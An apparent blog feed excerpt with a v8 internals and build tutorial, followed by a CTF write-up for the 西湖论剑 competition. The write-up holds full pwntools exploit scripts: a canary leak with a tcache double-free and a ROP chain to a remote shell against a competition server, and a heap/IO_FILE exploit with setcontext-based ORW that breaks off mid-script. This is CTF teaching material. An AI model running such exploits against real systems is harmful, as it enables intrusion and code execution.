    <title>v8 学习基础</title>
    <link href="wood1314.github.io/year/11/12/ckur473ep0041ab154sax4c2h/"/>
    <id>wood1314.github.io/year/11/12/ckur473ep0041ab154sax4c2h/</id>
    <published>2020-11-12T03:21:54.000Z</published>
    <updated>2020-11-12T06:21:06.100Z</updated>
    
    <content type="html"><![CDATA[<p>主要是v8对象基础的概念。</p><a id="more"></a><h2 id="0x01-v8是什么"><a href="#0x01-v8是什么" class="headerlink" title="0x01 v8是什么"></a>0x01 v8是什么</h2><p>简而言之，v8就是js的解释器。</p><p>V8由很多子模块构成，其中，有几个最重要的模块：</p><ul><li>Parser：负责将JavaScript源码转换为Abstract Syntax Tree (AST)</li><li>Ignition：interpreter，即解释器，负责将AST转换为Bytecode，解释执行Bytecode；同时收集TurboFan优化编译所需的信息，比如函数参数的类型</li><li>TurboFan：compiler，即编译器，利用Ignitio所收集的类型信息，将Bytecode转换为优化的汇编代码</li><li>Orinoco：garbage collector，垃圾回收模块，负责将程序不再需要的内存空间回收</li></ul><p>Parser、Ignition、Turbofan协作将JS源码最终编译成汇编代码</p><p><img src="/12/ckur473ep0041ab154sax4c2h/1.jpg" alt="v8结构图"></p><h2 id="0x02-v8-中JS对象结构"><a href="#0x02-v8-中JS对象结构" class="headerlink" title="0x02 v8 中JS对象结构"></a>0x02 v8 中JS对象结构</h2><p>在下面的代码中定义了a,b两个对象，下面在调试中观察下里面的数据和结构。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo1</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> Foo1();</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> Foo1();</span><br><span class="line"></span><br><span class="line">a.name = <span class="string">'name-a'</span>;</span><br><span class="line">a.text = <span class="string">'aaa'</span>;</span><br><span class="line">b.name = <span class="string">'name-b'</span>;</span><br><span class="line">b.text = <span class="string">'bbb'</span>;</span><br><span class="line">a[<span class="number">1</span>] = <span class="string">"a-1"</span>;</span><br><span class="line">a[<span class="number">2</span>] = <span class="string">"a-2"</span>;</span><br><span class="line"></span><br><span class="line">%DebugPrint(a);  <span class="comment">//d8中用来打印object内存信息</span></span><br><span class="line">%DebugPrint(b);  <span class="comment">//d8中用来打印object内存信息</span></span><br><span class="line">%SystemBreak();  <span class="comment">//d8中用来中断，调试</span></span><br></pre></td></tr></table></figure><h3 id="2-1-使用谷歌浏览器观察"><a href="#2-1-使用谷歌浏览器观察" class="headerlink" title="2.1 使用谷歌浏览器观察"></a>2.1 使用谷歌浏览器观察</h3><p>首先先在谷歌开发工具中键入上面的代码，然后在Memory中拍摄快照</p><p><img src="/12/ckur473ep0041ab154sax4c2h/2.png" alt="v8结构图"></p><p>我们大致可以看出来，对于a它有两个属性，分别是<code>name</code>和<code>text</code>，这两个属性直接保存在对象结构中。还有两个字符串”a-1”和”a-2”,他们作为<code>元素</code>，保存在了elements中。</p><p><img src="/12/ckur473ep0041ab154sax4c2h/3.png" alt="`"></p><p>因此暂时可以猜测，对象中保存的数据有两种形式： 一种是不需要索引的，称为<code>属性</code>, 另一种是需要索引的，称为<code>元素</code></p><h3 id="2-2-在ubuntu中编译v8观察"><a href="#2-2-在ubuntu中编译v8观察" class="headerlink" title="2.2 在ubuntu中编译v8观察"></a>2.2 在ubuntu中编译v8观察</h3><p>让我们单独看a打印出来的结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x1c6808148b91: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x1c68083074fd &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1c6808148b0d &lt;Object map = 0x1c68083074ad&gt;</span><br><span class="line"> - elements: 0x1c6808148c81 &lt;FixedArray[19]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x1c6808042229 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x1c68080447d5: [String] in ReadOnlySpace: #name: 0x1c68082d2591 &lt;String[6]: #name-a&gt; (const data field 0), location: in-object //name属性</span><br><span class="line">    0x1c68082d25a5: [String] in OldSpace: #text: 0x1c68082d25b5 &lt;String[3]: #aaa&gt; (const data field 1), location: in-object //text属性</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x1c6808148c81 &lt;FixedArray[19]&gt; &#123;</span><br><span class="line">           0: 0x1c6808042429 &lt;the_hole&gt;  //element中的元素</span><br><span class="line">           1: 0x1c68082d25e9 &lt;String[3]: #a-1&gt;</span><br><span class="line">           2: 0x1c68082d25f9 &lt;String[3]: #a-2&gt;</span><br><span class="line">        3-18: 0x1c6808042429 &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x1c68083074fd: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE  //实例类型</span><br><span class="line"> - instance size: 52     //实例大小</span><br><span class="line"> - inobject properties: 10   //对象内属性存储空间（包含未使用的slots）</span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8  //未使用的属性slot数</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map              //对象当前处于快速模式（dictionary_map：字典模式）</span><br><span class="line"> - back pointer: 0x1c68083074d5 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x1c68082d2939 &lt;Cell value= 0&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x1c6808148c59 &lt;DescriptorArray[2]&gt;</span><br><span class="line"> - prototype: 0x1c6808148b0d &lt;Object map = 0x1c68083074ad&gt;</span><br><span class="line"> - constructor: 0x1c68082d2835 &lt;JSFunction Foo1 (sfi = 0x1c68082d26ad)&gt;</span><br><span class="line"> - dependent code: 0x1c68080421b5 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 5</span><br></pre></td></tr></table></figure><p>在v8中打印出的结构更确认了我们上面的猜测，并且更多看到了一些东西。比如map。</p><p>还有一些其它的</p><p>prototype prototype<br>elements 对象元素<br>length 元素个数<br>properties 属性</p><p>结构图如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> elements  ----&gt; +------------------------+</span><br><span class="line">                  |          MAP           +&lt;---------+</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      element 1         |          |</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      element 2         |          |</span><br><span class="line">                  |      ......            |          |</span><br><span class="line">                  |      element n         |          |</span><br><span class="line">ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                  |      map               |          |</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      prototype         |          |</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      elements          |          |</span><br><span class="line">                  |                        +----------+</span><br><span class="line">                  +------------------------+</span><br><span class="line">                  |      length            |</span><br><span class="line">                  +------------------------+</span><br><span class="line">                  |      properties        |</span><br><span class="line">                  +------------------------+</span><br></pre></td></tr></table></figure><h3 id="0x03-v8环境搭建"><a href="#0x03-v8环境搭建" class="headerlink" title="0x03 v8环境搭建"></a>0x03 v8环境搭建</h3><h3 id="3-1代理配置"><a href="#3-1代理配置" class="headerlink" title="3.1代理配置"></a>3.1代理配置</h3><p>首先在本地的小飞机中，选项设置-》本地代理设置-》开启本地代理-》选择端口</p><p>配置git代理,后面的ip采用自己宿主机的，端口采用上一步设置的端口，虚拟机配置采用nat模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy http://192.168.235.1:1080</span><br></pre></td></tr></table></figure><p>配置环境变量,进行全局代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">"http://192.168.235.1:1080"</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="variable">$http_proxy</span></span><br></pre></td></tr></table></figure><p>下载工具,并设置环境变量（注意此处环境变量的路径与你下载的路径是否相同</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH=$PATH:"$HOME/depot_tools"'</span> &gt;&gt; ~/.bashrc</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br><span class="line"><span class="built_in">cd</span> ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH=$PATH:"$HOME/ninja"'</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure><p>编译<code>v8</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch v8 &amp;&amp; <span class="built_in">cd</span> v8</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gclient sync</span><br><span class="line"><span class="comment">#更新</span></span><br><span class="line">git reset --hard [commit <span class="built_in">hash</span> with vulnerability]</span><br><span class="line"><span class="comment">#切换版本</span></span><br><span class="line"></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug [d8]</span><br><span class="line"><span class="comment">#d8参数表示只编译d8</span></span><br><span class="line"><span class="comment">#debug-&gt;release编译release版本</span></span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./out.gn/x64.release/d8</span><br><span class="line"><span class="comment">#启动d8交互shell</span></span><br><span class="line">./out.gn/x64.release/d8 test.js</span><br><span class="line"><span class="comment">#运行test.js</span></span><br><span class="line">./out.gn/x64.debug/d8</span><br><span class="line">./out.gn/x64.debug/shell</span><br><span class="line">./out.gn/x64.debug/d8 test.js</span><br></pre></td></tr></table></figure><p>调试工具,这个gdbinit如果没有的话需要从网上自行下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'source /home/w4rd3n/v8/tools/gdbinit'</span> &gt;&gt; ~/.gdbinit</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'source /home/w4rd3n/v8/tools/gdb-v8-support.py'</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;主要是v8对象基础的概念。&lt;/p&gt;
    
    </summary>
    
      <category term="v8pwn" scheme="wood1314.github.io/categories/v8pwn/"/>
    
    
      <category term="v8" scheme="wood1314.github.io/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑</title>
    <link href="wood1314.github.io/year/10/14/ckur473f6005sab15fnol1evz/"/>
    <id>wood1314.github.io/year/10/14/ckur473f6005sab15fnol1evz/</id>
    <published>2020-10-14T15:44:31.000Z</published>
    <updated>2020-10-14T16:20:45.377Z</updated>
    
    <content type="html"><![CDATA[<p>1，3题很简单。5题当时已经想到要打printf的返回地址，但是当时调试崩掉了就没出。2题和4题没看，都是server还蛮有意思。</p><a id="more"></a><h2 id="mmutag"><a href="#mmutag" class="headerlink" title="mmutag"></a>mmutag</h2><p>在栈上构造fake_chunk，然后用rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"><span class="comment"># sh = process('./mmutag')</span></span><br><span class="line">sh = remote(<span class="string">'183.129.189.62'</span>,<span class="number">58004</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(<span class="string">'choise:\n'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'choise:\n'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x4006B0</span></span><br><span class="line">puts_got = <span class="number">0x602020</span></span><br><span class="line">libc_start_main = <span class="number">0x602048</span></span><br><span class="line">rdi_ret = <span class="number">0x0000000000400d23</span></span><br><span class="line">rsi_r15_ret = <span class="number">0x0000000000400d21</span></span><br><span class="line">start_addr = <span class="number">0x400750</span></span><br><span class="line">sh.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">sh.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'tag: '</span>)</span><br><span class="line">stack_addr = int(sh.recvuntil(<span class="string">':'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'stack = '</span> + hex(stack_addr))</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'choise:'</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x18</span> + <span class="string">'z'</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'Your content: '</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'z'</span>)</span><br><span class="line">canary = u64(sh.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'canary = '</span> + hex(canary))</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(<span class="number">0x71</span>) + p64(canary)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'bbb'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">add(<span class="number">3</span>,p64(stack_addr - <span class="number">0x38</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'a'</span>)</span><br><span class="line">payload = p64(canary) + p64(<span class="number">0</span>) + p64(rdi_ret) + p64(libc_start_main) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">add(<span class="number">6</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># for start</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil('choise:\n')</span></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">"puts_addr = "</span> + hex(puts_addr))</span><br><span class="line"><span class="comment"># libc = LibcSearcher('__libc_start_main',puts_addr)</span></span><br><span class="line">libc_base = puts_addr - <span class="number">0x20750</span></span><br><span class="line"><span class="comment"># bin_sh = libc_base + libc.dump('str_bin_sh')</span></span><br><span class="line">system = libc_base + <span class="number">0x453a0</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x18CE17</span></span><br><span class="line"><span class="comment"># system = libc_base + libc.dump('system')</span></span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">sh.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">sh.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'tag: '</span>)</span><br><span class="line">stack_addr = int(sh.recvuntil(<span class="string">':'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'stack = '</span> + hex(stack_addr))</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(<span class="number">0x71</span>) + p64(canary)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">7</span>,p64(stack_addr - <span class="number">0x38</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="string">'a'</span>)</span><br><span class="line">payload = p64(canary) + p64(<span class="number">0</span>) + p64(rdi_ret) + p64(bin_sh) + p64(system)</span><br><span class="line">add(<span class="number">10</span>,payload)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="http-server"><a href="#http-server" class="headerlink" title="http_server"></a>http_server</h2><p>模拟了post传参。思路就是tcache打IO_FILE然后leak libc，最后打free_hook写setcontext+53出发SROP，然后调用rop链进行orw</p><p>复现的时候碰到了点小问题，就是把stdout的writebase覆盖掉在回显的时候会崩。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'AMD64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"POST /create Cookie: user=admin token: \x34\r\n\r\ncontent="</span> + content)</span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"POST /del Cookie: user=admin token: \x34\r\n\r\nindex="</span> + str(idx))</span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"POST /edit Cookie: user=admin token: \x34\r\n\r\nindex="</span> +str(idx) +  <span class="string">"&amp;content="</span>+ content)</span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process(<span class="string">'./ezhttp'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        new(<span class="string">"a"</span>*<span class="number">0x80</span>)</span><br><span class="line">        p.recvuntil(<span class="string">"Your gift: "</span>)</span><br><span class="line">        heap_base = int(p.recvuntil(<span class="string">'"&#125;'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x260</span></span><br><span class="line">        log.success(<span class="string">'HEAP:\t'</span> + hex(heap_base))</span><br><span class="line">        new(<span class="string">"a"</span>*<span class="number">0x20</span>+<span class="string">'\x00'</span>)</span><br><span class="line">        new(<span class="string">"a"</span>*<span class="number">0x10</span>+<span class="string">'\x00'</span>)</span><br><span class="line">        new(<span class="string">"A"</span>*<span class="number">0x100</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        new(p64(heap_base+<span class="number">0x260</span>))</span><br><span class="line">        new(p64(heap_base+<span class="number">0x260</span>))</span><br><span class="line"></span><br><span class="line">        new(<span class="string">'\x60\x07\xdd'</span>)</span><br><span class="line"></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        new(<span class="string">"a"</span>*<span class="number">0x20</span>)</span><br><span class="line">        edit(<span class="number">7</span>,p64(heap_base + <span class="number">0x260</span>))</span><br><span class="line">        new(<span class="string">"A"</span>*<span class="number">0x20</span>)</span><br><span class="line">        new(<span class="string">"A"</span>*<span class="number">0x20</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#new('a'*0x28)</span></span><br><span class="line">        new(p64(<span class="number">0x01010101fbad1801</span>)+<span class="string">"\x01"</span>*<span class="number">0x18</span>+<span class="string">"\xc8"</span>)</span><br><span class="line">        <span class="comment">#edit(10,p64(0xFBAD1800) + p64(0)*3 + '\xC8')</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        libc_base = u64(p.recvuntil(<span class="string">'\x7F'</span>,timeout=<span class="number">0.3</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">        log.success(<span class="string">'libc: '</span> + hex(libc_base))</span><br><span class="line">        free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">        system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">        setcontext = libc_base + libc.sym[<span class="string">'setcontext'</span>] + <span class="number">53</span></span><br><span class="line">        rce = libc_base + <span class="number">0x4f322</span></span><br><span class="line">        free(<span class="number">2</span>) </span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        new(p64(free_hook))</span><br><span class="line">        new(<span class="string">"UUUU"</span>)</span><br><span class="line">        </span><br><span class="line">        new(p64(setcontext))</span><br><span class="line">        ret = libc_base  + <span class="number">0x00000000000008aa</span></span><br><span class="line"></span><br><span class="line">        Open = libc_base + libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">        Read = libc_base + libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">        Puts = libc_base + libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">        pop_rdi_ret = libc_base +<span class="number">0x000000000002155f</span></span><br><span class="line">        pop_rsi_ret = libc_base + <span class="number">0x0000000000023e6a</span></span><br><span class="line">        pop_rdx_ret = libc_base + <span class="number">0x0000000000001b96</span></span><br><span class="line">        orw  = <span class="string">''</span></span><br><span class="line">        orw += p64(pop_rdi_ret)+p64(heap_base + <span class="number">0x3B8</span>)</span><br><span class="line">        orw += p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">        orw += p64(Open)</span><br><span 